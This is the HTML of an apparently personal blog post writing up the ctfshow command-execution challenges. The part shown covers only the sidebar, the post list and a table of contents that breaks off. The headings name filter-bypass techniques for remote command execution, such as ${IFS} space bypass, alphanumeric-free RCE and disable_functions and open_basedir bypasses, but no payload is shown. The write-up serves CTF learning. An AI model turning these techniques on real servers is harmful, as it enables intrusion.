<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>ctfshow-命令执行 | MIXBP</title>
  <meta name="keywords" content=" 学习笔记 , 命令执行 ">
  <meta name="description" content="ctfshow-命令执行 | MIXBP">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshow-sqli-labs">
<meta property="og:url" content="https://mixbp.github.io/master/2025/03/08/ctfshow-sqli-labs/index.html">
<meta property="og:site_name" content="MIXBP">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2025-03-08T09:51:18.000Z">
<meta property="article:modified_time" content="2025-03-08T09:51:47.470Z">
<meta property="article:author" content="MIXBP">
<meta property="article:tag" content="学习笔记">
<meta property="article:tag" content="sql注入">
<meta name="twitter:card" content="summary">


<link rel="icon" href="/img/avatar.jpg">

<link href="/css/style.css?v=1.1.0" rel="stylesheet">

<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">

<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">

<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="/js/titleTip.js?v=1.1.0" ></script>

<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>



<script src="/js/iconfont.js?v=1.1.0" ></script>

<meta name="generator" content="Hexo 7.3.0"></head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="">
  <input class="theme_blog_path" value="">
  <input id="theme_shortcut" value="true" />
  <input id="theme_highlight_on" value="true" />
  <input id="theme_code_copy" value="true" />
</div>



<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/"
   class="avatar_target">
    <img class="avatar"
         src="/img/avatar.jpg"/>
</a>
<div class="author">
    <span>MIXBP</span>
</div>

<div class="icon">
    
        
            <a title="github"
               href="https://mixbp.github.io/"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-github"></use>
                    </svg>
                
            </a>
        
    
        
            <a title="email"
               href="mailto:2439254357@qq.com"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-email"></use>
                    </svg>
                
            </a>
        
    
        
            <a title="qq"
               href="http://wpa.qq.com/msgrd?v=3&uin=2439254357&site=qq&menu=yes"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-qq"></use>
                    </svg>
                
            </a>
        
    
</div>



    <a class="more-menus">更多菜单</a>



<ul>
    <li>
        <div class="all active" data-rel="All">All
            
                <small>(28)</small>
            
        </div>
    </li>
    
</ul>
<div class="left-bottom">
    <div class="menus">
        
            
            
                <a class="dynamic-menu "
                   target="_self"
                   
                   href="https://mixbp.github.io/">MIXBP</a>
        
            
                <a class="dynamic-menu "
                   target="_blank"
                        
                   href="https://mixbp.github.io/">github</a>
        
    </div>
    <div>
        
            <a class="about  hasFriend  site_url"
               
               href="/about">About</a>
        
        <a style="width: 50%"
                
                                           class="friends">Friends</a>
        
    </div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="28">
<input type="hidden" id="yelog_site_word_count" value="68.7k">
<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        Links
        <i class="iconfont icon-left"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="https://mixbp.github.io/">MIXBP</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <div class="right-top">
        <div id="default-panel">
            <i class="iconfont icon-search" data-title="search shortcut key i"></i>
            <div class="right-title">All</div>
            <i class="iconfont icon-file-tree" data-title="switch to outline view shortcut key w"></i>
        </div>
        <div id="search-panel">
            <i class="iconfont icon-left" data-title="return"></i>
            <input id="local-search-input" autocomplete="off"/>
            <label class="border-line" for="input"></label>
            <i class="iconfont icon-case-sensitive" data-title="case sensitive"></i>
            <i class="iconfont icon-tag" data-title="label"></i>
        </div>
        <div id="outline-panel" style="display: none">
            <div class="right-title">outline</div>
            <i class="iconfont icon-list" data-title="switch to article list"></i>
        </div>
    </div>

    <div class="tags-list">
    <input id="tag-search" />
    <div class="tag-wrapper">
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>命令执行</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>日志包含</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>文件包含</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>文件上传</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>信息搜集</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>学习笔记</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>正则表达式</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>做题笔记</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>filter伪协议</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>HTML</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>http协议</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>linux</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>MySQL</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>payload构造</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>php</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>PHP反序列化漏洞</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>php特性</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>python</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>sql注入</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>xss</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>xss漏洞</a>
            </li>
        
    </div>

</div>

    
    <div id="local-search-result">

    </div>
    
    <nav id="title-list-nav">
        
        
        <a  class="All "
           href="/2025/03/08/ctfshow-sqli-labs/"
           data-tag="学习笔记,sql注入"
           data-author="" >
            <span class="post-title" title="ctfshow-sqli-labs">ctfshow-sqli-labs</span>
            <span class="post-date" title="2025-03-08 17:51:18">2025/03/08</span>
        </a>
        
        
        <a  class="All "
           href="/2025/03/04/ctfshow-sql%E6%B3%A8%E5%85%A5/"
           data-tag="学习笔记,sql注入"
           data-author="" >
            <span class="post-title" title="ctfshow-sql注入">ctfshow-sql注入</span>
            <span class="post-date" title="2025-03-04 23:42:23">2025/03/04</span>
        </a>
        
        
        <a  class="All "
           href="/2025/03/02/php%E7%89%B9%E6%80%A7/"
           data-tag="学习笔记,php特性"
           data-author="" >
            <span class="post-title" title="php特性">php特性</span>
            <span class="post-date" title="2025-03-02 20:14:41">2025/03/02</span>
        </a>
        
        
        <a  class="All "
           href="/2025/02/23/ctfshow-xss/"
           data-tag="学习笔记,xss"
           data-author="" >
            <span class="post-title" title="ctfshow-xss">ctfshow-xss</span>
            <span class="post-date" title="2025-02-23 17:12:49">2025/02/23</span>
        </a>
        
        
        <a  class="All "
           href="/2025/02/23/ctfshow-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"
           data-tag="学习笔记,信息搜集"
           data-author="" >
            <span class="post-title" title="ctfshow-信息搜集">ctfshow-信息搜集</span>
            <span class="post-date" title="2025-02-23 15:24:36">2025/02/23</span>
        </a>
        
        
        <a  class="All "
           href="/2025/02/17/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
           data-tag="学习笔记,命令执行"
           data-author="" >
            <span class="post-title" title="ctfshow-命令执行">ctfshow-命令执行</span>
            <span class="post-date" title="2025-02-17 00:00:48">2025/02/17</span>
        </a>
        
        
        <a  class="All "
           href="/2025/02/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
           data-tag="学习笔记,PHP反序列化漏洞"
           data-author="" >
            <span class="post-title" title="PHP反序列化">PHP反序列化</span>
            <span class="post-date" title="2025-02-14 00:51:53">2025/02/14</span>
        </a>
        
        
        <a  class="All "
           href="/2025/02/12/xss%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
           data-tag="学习笔记,xss漏洞"
           data-author="" >
            <span class="post-title" title="xss漏洞总结">xss漏洞总结</span>
            <span class="post-date" title="2025-02-12 03:30:15">2025/02/12</span>
        </a>
        
        
        <a  class="All "
           href="/2025/02/11/xss-labs/"
           data-tag="学习笔记,xss漏洞"
           data-author="" >
            <span class="post-title" title="xss-labs">xss-labs</span>
            <span class="post-date" title="2025-02-11 23:43:19">2025/02/11</span>
        </a>
        
        
        <a  class="All "
           href="/2025/02/01/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"
           data-tag="学习笔记,linux"
           data-author="" >
            <span class="post-title" title="linux基础命令">linux基础命令</span>
            <span class="post-date" title="2025-02-01 22:14:44">2025/02/01</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
           data-tag="学习笔记,命令执行"
           data-author="" >
            <span class="post-title" title="命令执行">命令执行</span>
            <span class="post-date" title="2025-01-29 22:54:38">2025/01/29</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/29/ctfshow-web82/"
           data-tag="做题笔记,文件包含"
           data-author="" >
            <span class="post-title" title="ctfshow-web82">ctfshow-web82</span>
            <span class="post-date" title="2025-01-29 04:36:22">2025/01/29</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
           data-tag="学习笔记,文件包含"
           data-author="" >
            <span class="post-title" title="文件包含漏洞总结">文件包含漏洞总结</span>
            <span class="post-date" title="2025-01-29 02:22:55">2025/01/29</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/26/ctfshow-web160/"
           data-tag="做题笔记,文件上传,日志包含"
           data-author="" >
            <span class="post-title" title="[ctfshow]web160">[ctfshow]web160</span>
            <span class="post-date" title="2025-01-26 16:37:35">2025/01/26</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/26/buuctf%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98upload/"
           data-tag="做题笔记,文件上传"
           data-author="" >
            <span class="post-title" title="buuctf极客大挑战upload">buuctf极客大挑战upload</span>
            <span class="post-date" title="2025-01-26 16:36:39">2025/01/26</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/22/upload/"
           data-tag="学习笔记,文件上传"
           data-author="" >
            <span class="post-title" title="upload">upload</span>
            <span class="post-date" title="2025-01-22 15:22:47">2025/01/22</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/19/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
           data-tag="学习笔记,python"
           data-author="" >
            <span class="post-title" title="python学习笔记">python学习笔记</span>
            <span class="post-date" title="2025-01-19 01:39:35">2025/01/19</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/"
           data-tag="做题笔记,http协议"
           data-author="" >
            <span class="post-title" title="极客大挑战2019Http">极客大挑战2019Http</span>
            <span class="post-date" title="2025-01-09 16:47:44">2025/01/09</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/"
           data-tag="做题笔记,filter伪协议"
           data-author="" >
            <span class="post-title" title="极客大挑战2019SecretFile">极客大挑战2019SecretFile</span>
            <span class="post-date" title="2025-01-09 01:36:08">2025/01/09</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/"
           data-tag="做题笔记,sql注入"
           data-author="" >
            <span class="post-title" title="极客大挑战2019LoveSQL">极客大挑战2019LoveSQL</span>
            <span class="post-date" title="2025-01-05 20:00:42">2025/01/05</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/"
           data-tag="做题笔记,payload构造"
           data-author="" >
            <span class="post-title" title="极客大挑战2019Havefun">极客大挑战2019Havefun</span>
            <span class="post-date" title="2025-01-05 19:35:48">2025/01/05</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL/"
           data-tag="做题笔记,sql注入"
           data-author="" >
            <span class="post-title" title="极客大挑战2019EasySQL">极客大挑战2019EasySQL</span>
            <span class="post-date" title="2025-01-05 19:10:32">2025/01/05</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/03/sql%E6%B3%A8%E5%85%A5/"
           data-tag="学习笔记,sql注入"
           data-author="" >
            <span class="post-title" title="sql注入">sql注入</span>
            <span class="post-date" title="2025-01-03 21:14:16">2025/01/03</span>
        </a>
        
        
        <a  class="All "
           href="/2024/12/29/MySQL/"
           data-tag="学习笔记,MySQL"
           data-author="" >
            <span class="post-title" title="MySQL">MySQL</span>
            <span class="post-date" title="2024-12-29 19:30:51">2024/12/29</span>
        </a>
        
        
        <a  class="All "
           href="/2024/12/28/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AC%94%E8%AE%B0/"
           data-tag="学习笔记,正则表达式"
           data-author="" >
            <span class="post-title" title="正则表达式笔记">正则表达式笔记</span>
            <span class="post-date" title="2024-12-28 20:46:55">2024/12/28</span>
        </a>
        
        
        <a  class="All "
           href="/2024/12/26/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
           data-tag="学习笔记,php"
           data-author="" >
            <span class="post-title" title="PHP学习笔记">PHP学习笔记</span>
            <span class="post-date" title="2024-12-26 23:50:15">2024/12/26</span>
        </a>
        
        
        <a  class="All "
           href="/2024/12/25/HTML%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
           data-tag="学习笔记,HTML"
           data-author="" >
            <span class="post-title" title="HTML学习笔记">HTML学习笔记</span>
            <span class="post-date" title="2024-12-25 23:54:00">2024/12/25</span>
        </a>
        
        
        <a  class="All "
           href="/2024/12/25/welcome/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="welcome">welcome</span>
            <span class="post-date" title="2024-12-25 20:38:33">2024/12/25</span>
        </a>
        
        <div id="no-item-tips">

        </div>
    </nav>
    <div id="outline-list">
    </div>
</div>

    </div>
    <div class="hide-list">
        <div class="semicircle" data-title="Toggle full screen shortcut key s">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div id="post">
    <div class="pjax">
        <article id="post-ctfshow-命令执行" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">ctfshow-命令执行</h1>
    
    <div class="article-meta">
        
        
        
        
        <span class="tag">
            <i class="iconfont icon-tag"></i>
            
            <a class="color5">学习笔记</a>
            
            <a class="color5">命令执行</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
            Created At : <time class="date" title='Updated At: 2025-03-08 17:04:56'>2025-02-17 00:00</time>
        
    </div>
    <div class="article-meta">
        
        <span>Count:5.7k</span>
        
        
        <span id="busuanzi_container_page_pv">
            Views 👀 :<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
        <span class="top-comment" title="Jump to comment area">
            <a href="#comments">
                Comment:<span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </a>
        </span>
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">web-命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-29%EF%BC%88-%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%EF%BC%89"><span class="toc-text">web-29（*模糊匹配）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-30%EF%BC%88passthru%E3%80%81-%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%EF%BC%89"><span class="toc-text">web-30（passthru、*模糊匹配）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-31%EF%BC%88tac%E3%80%81-09%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E3%80%81%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87%E5%8D%95%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4%EF%BC%89"><span class="toc-text">web-31（tac、%09绕过空格过滤、双引号绕过单引号过滤）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-32%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%81filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E3%80%81%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%EF%BC%89"><span class="toc-text">web-32（文件包含、filter伪协议、变量覆盖）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-33%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%81data-%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="toc-text">web-33（文件包含、data:&#x2F;&#x2F;伪协议）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-34%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%81input%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="toc-text">web-34（文件包含、input伪协议）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-35%EF%BC%88%E5%90%8C%E5%89%8D%E5%87%A0%E9%A2%98%EF%BC%89"><span class="toc-text">web-35（同前几题）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-36%EF%BC%88%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%EF%BC%89"><span class="toc-text">web-36（日志包含）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-37%EF%BC%88data-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E3%80%81base64%E5%8A%A0%E5%AF%86%EF%BC%89"><span class="toc-text">web-37（data:&#x2F;&#x2F;伪协议、base64加密）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-38%EF%BC%88%E5%90%8C%E4%B8%8A%E9%A2%98%EF%BC%89"><span class="toc-text">web-38（同上题）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-39%EF%BC%88data-%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="toc-text">web-39（data:&#x2F;&#x2F;伪协议）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-40%EF%BC%88%E6%97%A0%E5%8F%82%E6%95%B0RCE%E7%BB%95%E8%BF%87%E3%80%81scandir%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%89"><span class="toc-text">web-40（无参数RCE绕过、scandir文件读取）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-41%EF%BC%88%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%88%96%E8%BF%90%E7%AE%97%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-41（无字母数字或运算绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-42%EF%BC%88-%E7%BB%95%E8%BF%87-dev-null-2-1%E5%91%BD%E4%BB%A4%EF%BC%89"><span class="toc-text">web-42（||绕过 &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1命令）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-43%EF%BC%88tac%EF%BC%89"><span class="toc-text">web-43（tac）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-44%EF%BC%88-%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%EF%BC%89"><span class="toc-text">web-44（*模糊匹配）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-45%EF%BC%88-09%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E3%80%81-IFS-%EF%BC%89"><span class="toc-text">web-45（%09绕过空格过滤、${IFS}）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-46%EF%BC%88-%E8%BD%AC%E4%B9%89%E3%80%81-%E8%BD%AC%E4%B9%89%E7%BB%95%E8%BF%87-%E5%8F%B7%E8%BF%87%E6%BB%A4%EF%BC%89"><span class="toc-text">web-46（?转义、\转义绕过*号过滤）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-47%EF%BC%88%E5%90%8C%E4%B8%8A%E9%A2%98%EF%BC%89"><span class="toc-text">web-47（同上题）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-48%EF%BC%88%E5%90%8C%E4%B8%8A%E9%A2%98%EF%BC%89"><span class="toc-text">web-48（同上题）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-49%EF%BC%88%E5%90%8C%E4%B8%8A%E9%A2%98%EF%BC%89"><span class="toc-text">web-49（同上题）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-50%EF%BC%88"><span class="toc-text">web-50（&lt;重定向符绕过空格过滤）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-51%EF%BC%88nl%E3%80%81"><span class="toc-text">web-51（nl、&lt;重定向符）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-52%EF%BC%88-IFS-%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%EF%BC%89"><span class="toc-text">web-52（${IFS}绕过空格过滤）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-53%EF%BC%88%E5%90%8C%E4%B8%8A%EF%BC%89"><span class="toc-text">web-53（同上）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-54%EF%BC%88%E9%80%9A%E8%BF%87%E5%91%BD%E4%BB%A4%E8%B7%AF%E5%BE%84%E4%BD%BF%E7%94%A8cat%E5%91%BD%E4%BB%A4%E3%80%81rev%EF%BC%89"><span class="toc-text">web-54（通过命令路径使用cat命令、rev）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-55%EF%BC%88%E6%97%A0%E5%AD%97%E6%AF%8Dbase64-%E9%80%9A%E9%85%8D%E7%AC%A6%E3%80%81-usr-bin-bzip2%E5%8E%8B%E7%BC%A9%E5%91%BD%E4%BB%A4%E3%80%81bash-shell%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6%EF%BC%89"><span class="toc-text">web-55（无字母base64+通配符、&#x2F;usr&#x2F;bin&#x2F;bzip2压缩命令、bash shell转义字符）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-56%EF%BC%88%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE%EF%BC%89"><span class="toc-text">web-56（无字母数字RCE）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-57%EF%BC%88%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE%E6%9E%84%E9%80%A0%E6%95%B0%E5%AD%97%EF%BC%89"><span class="toc-text">web-57（无数字字母RCE构造数字）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-58%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AA%81%E7%A0%B4%E7%A6%81%E7%94%A8%E5%87%BD%E6%95%B0%E3%80%81include%E5%8A%A0%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E3%80%81highlight-file-%E3%80%81show-source-%EF%BC%89"><span class="toc-text">web-58（命令执行突破禁用函数、include加伪协议读取文件、highlight_file()、show_source()）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-59%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AA%81%E7%A0%B4%E7%A6%81%E7%94%A8%E5%87%BD%E6%95%B0%EF%BC%89"><span class="toc-text">web-59（命令执行突破禁用函数）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-60%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AA%81%E7%A0%B4%E7%A6%81%E7%94%A8%E5%87%BD%E6%95%B0%E3%80%81%E6%89%AB%E6%8F%8F%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%EF%BC%89"><span class="toc-text">web-60（命令执行突破禁用函数、扫描当前目录）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-61-64%EF%BC%88%E5%90%8C%E4%B8%8A%EF%BC%89"><span class="toc-text">web-61-64（同上）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-65%EF%BC%88%E6%97%A0%E5%8F%82%E6%95%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E3%80%81include%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%85%8D%E5%90%88echo%E8%BE%93%E5%87%BAflag%EF%BC%89"><span class="toc-text">web-65（无参数文件读取、include文件包含配合echo输出flag）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-66%EF%BC%88%E6%A0%B9%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E3%80%81php%E5%8E%9F%E7%94%9F%E7%B1%BB%EF%BC%89"><span class="toc-text">web-66（根目录扫描、php原生类）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-67%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AA%81%E7%A0%B4%E7%A6%81%E7%94%A8%E5%87%BD%E6%95%B0%EF%BC%89"><span class="toc-text">web-67（命令执行突破禁用函数）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-68%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AA%81%E7%A0%B4%E7%A6%81%E7%94%A8%E5%87%BD%E6%95%B0%E3%80%81readgzfile%E3%80%81splFileobject-fpassthru%EF%BC%89"><span class="toc-text">web-68（命令执行突破禁用函数、readgzfile、splFileobject-&gt;fpassthru）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-69%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AA%81%E7%A0%B4%E7%A6%81%E7%94%A8%E5%87%BD%E6%95%B0%E3%80%81implode%E3%80%81var-export%E3%80%81json-encode%EF%BC%89"><span class="toc-text">web-69（命令执行突破禁用函数、implode、var_export、json_encode）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-70%EF%BC%88%E5%90%8C%E4%B8%8A%EF%BC%89"><span class="toc-text">web-70（同上）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-71%EF%BC%88%E6%AD%A3%E5%88%99%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87%E3%80%81%E6%8F%90%E5%89%8D%E9%80%81%E5%87%BA%E7%BC%93%E5%86%B2%E5%8C%BA%E6%88%96%E7%BB%88%E6%AD%A2%E7%A8%8B%E5%BA%8F%E3%80%81ob-flush-%E3%80%81ob-end-flush%E3%80%81exit%E3%80%81die%EF%BC%89"><span class="toc-text">web-71（正则替换绕过、提前送出缓冲区或终止程序、ob_flush()、ob_end_flush、exit、die）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-72%EF%BC%88%E6%9A%82%E6%97%B6%E8%BF%98%E7%9C%8B%E4%B8%8D%E6%87%82%E3%80%81open-basedir%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E3%80%81%E8%84%9A%E6%9C%ACuaf%EF%BC%89"><span class="toc-text">web-72（暂时还看不懂、open_basedir限制绕过、脚本uaf）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-73%EF%BC%88reqadgzfile%E3%80%81var-export%EF%BC%89"><span class="toc-text">web-73（reqadgzfile、var_export）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-74%EF%BC%88glob%E4%BC%AA%E5%8D%8F%E8%AE%AE%E3%80%81var-export%EF%BC%89"><span class="toc-text">web-74（glob伪协议、var_export）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 